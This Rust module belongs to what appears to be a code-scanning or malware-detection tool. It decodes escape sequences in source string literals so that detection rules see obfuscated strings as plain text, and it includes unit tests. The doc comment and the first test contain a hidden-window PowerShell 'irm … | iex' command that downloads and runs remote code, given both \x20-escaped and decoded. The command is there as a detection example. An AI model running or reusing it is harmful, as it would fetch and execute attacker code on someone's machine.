//! Escape-sequence decoding for parsed source string literals.
//!
//! Shared by the two literal-extraction paths in this module: the strings
//! corpus that backs `type: literal`, and the call-argument values that back
//! `arg: { kind: string, ... }`. Both need the value the program will use, not
//! the way the source spelled it.

/// Decode the escape sequences a source string literal carries, so a matcher
/// sees the text the program will actually use.
///
/// Without this, escape-encoding is a total evasion for anything matching on
/// literal values. `js-obfuscator` writes every space in its string table as
/// `\x20`, so a shipped payload of
/// `'powershell\x20-WindowStyle\x20Hidden\x20-Command\x20\x22irm\x20…|\x20iex\x22'`
/// is byte-identical at runtime to the plain command and unrecognisable to a
/// rule looking for `powershell -Command`. That costs an attacker one flag on a
/// packer they were already running, and it defeats every literal and
/// call-argument matcher at once; `\u` forms buy the same free pass.
///
/// Only escapes that mean the same thing in every language cleave parses are
/// decoded. An unrecognised escape keeps its backslash, so a regex (`\d`), a
/// Windows path, or a language-specific form passes through unchanged rather
/// than being silently corrupted.
///
/// **This is deliberately not stng's `decode_unicode_escapes`, and the two
/// should not be merged.** stng decodes raw byte runs with no parse tree, so it
/// cannot tell a string literal from a comment or a Windows path, and it
/// decodes *through* a doubled backslash (`\\x41` -> `A`) on the assumption
/// that it is looking at a nested escape layer. That assumption is right for a
/// byte run and wrong here: inside a parsed literal `\\x41` is a backslash
/// followed by the characters `x41`, and decoding it would corrupt every
/// Windows path and regex in the corpus. Sharing one implementation would mean
/// a mode flag whose only purpose is to switch between the two behaviours.
pub(super) fn decode(s: &str) -> String {
    if !s.contains('\\') {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        let Some(esc) = chars.next() else {
            out.push('\\');
            break;
        };
        match esc {
            'n' => out.push('\n'),
            'r' => out.push('\r'),
            't' => out.push('\t'),
            '0' => out.push('\0'),
            'a' => out.push('\u{7}'),
            'b' => out.push('\u{8}'),
            'f' => out.push('\u{c}'),
            'v' => out.push('\u{b}'),
            '\\' | '\'' | '"' | '`' | '/' | '$' => out.push(esc),
            // A backslash before a newline is a line continuation: the literal
            // keeps going, and neither character is part of the value.
            '\n' => {}
            'x' => match take_hex_escape(&mut chars, 2).and_then(char::from_u32) {
                Some(decoded) => out.push(decoded),
                None => {
                    out.push('\\');
                    out.push('x');
                }
            },
            'u' => match decode_unicode_escape(&mut chars) {
                Some(decoded) => out.push(decoded),
                None => {
                    out.push('\\');
                    out.push('u');
                }
            },
            other => {
                out.push('\\');
                out.push(other);
            }
        }
    }
    out
}

/// Read exactly `n` hex digits, consuming them only if all `n` are present.
fn take_hex_escape(chars: &mut std::iter::Peekable<std::str::Chars<'_>>, n: usize) -> Option<u32> {
    // Read from a clone and commit only on success, so a truncated escape
    // (`\u12"`) leaves the digits in place to be emitted verbatim rather than
    // swallowing them.
    let mut lookahead = chars.clone();
    let mut digits = String::with_capacity(n);
    for _ in 0..n {
        let d = lookahead.next()?;
        if !d.is_ascii_hexdigit() {
            return None;
        }
        digits.push(d);
    }
    let value = u32::from_str_radix(&digits, 16).ok()?;
    *chars = lookahead;
    Some(value)
}

/// Decode the body of a `\u` escape: `\uNNNN`, the `\u{...}` form, or a
/// surrogate pair written as two consecutive `\uNNNN` escapes.
fn decode_unicode_escape(chars: &mut std::iter::Peekable<std::str::Chars<'_>>) -> Option<char> {
    // Decode against a copy and commit only on success: a lone high surrogate
    // consumes four digits before turning out to be undecodable, and those
    // digits have to survive to be emitted verbatim.
    let mut probe = chars.clone();
    let decoded = decode_unicode_escape_inner(&mut probe)?;
    *chars = probe;
    Some(decoded)
}

fn decode_unicode_escape_inner(
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
) -> Option<char> {
    if chars.peek() == Some(&'{') {
        chars.next();
        let mut digits = String::new();
        while let Some(&d) = chars.peek() {
            chars.next();
            if d == '}' {
                return u32::from_str_radix(&digits, 16)
                    .ok()
                    .and_then(char::from_u32);
            }
            if !d.is_ascii_hexdigit() || digits.len() >= 6 {
                return None;
            }
            digits.push(d);
        }
        return None;
    }
    let first = take_hex_escape(chars, 4)?;
    if let Some(decoded) = char::from_u32(first) {
        return Some(decoded);
    }
    // A high surrogate is not a character on its own; it pairs with the low
    // surrogate in the following escape. Only consume that escape if it is one.
    if !(0xD800..=0xDBFF).contains(&first) {
        return None;
    }
    let mut lookahead = chars.clone();
    if lookahead.next() != Some('\\') || lookahead.next() != Some('u') {
        return None;
    }
    let low = take_hex_escape(&mut lookahead, 4)?;
    if !(0xDC00..=0xDFFF).contains(&low) {
        return None;
    }
    let combined = 0x10000 + ((first - 0xD800) << 10) + (low - 0xDC00);
    let decoded = char::from_u32(combined)?;
    *chars = lookahead;
    Some(decoded)
}

#[cfg(test)]
mod tests {
    use super::decode;

    #[test]
    fn hex_escapes_are_decoded() {
        // js-obfuscator's default string table: every space becomes \x20.
        assert_eq!(
            decode(
                "powershell\\x20-WindowStyle\\x20Hidden\\x20-Command\\x20\\x22irm\\x20https://x/a\\x20|\\x20iex\\x22"
            ),
            "powershell -WindowStyle Hidden -Command \"irm https://x/a | iex\"",
        );
    }

    #[test]
    fn unicode_escapes_and_surrogate_pairs() {
        assert_eq!(decode("\\u0041\\u0042"), "AB");
        assert_eq!(decode("\\u{1F600}"), "\u{1F600}");
        assert_eq!(decode("\\uD83D\\uDE00"), "\u{1F600}");
    }

    #[test]
    fn common_control_and_quote_escapes() {
        assert_eq!(decode("a\\nb\\tc"), "a\nb\tc");
        assert_eq!(decode("say \\\"hi\\\""), "say \"hi\"");
        assert_eq!(decode("C:\\\\Users"), "C:\\Users");
    }

    #[test]
    fn unknown_escapes_pass_through_intact() {
        // A regex inside a string must survive unchanged, or a rule matching on
        // the pattern text would break.
        assert_eq!(decode("\\d{1,3}\\.\\w+"), "\\d{1,3}\\.\\w+");
        // Truncated or malformed escapes keep their backslash rather than
        // silently eating the characters that follow.
        assert_eq!(decode("\\xZZ"), "\\xZZ");
        assert_eq!(decode("\\u12"), "\\u12");
        // A lone high surrogate is not a character and has no pair to join.
        assert_eq!(decode("\\uD83D!"), "\\uD83D!");
    }

    #[test]
    fn strings_without_backslashes_are_untouched() {
        assert_eq!(decode("plain text"), "plain text");
    }
}
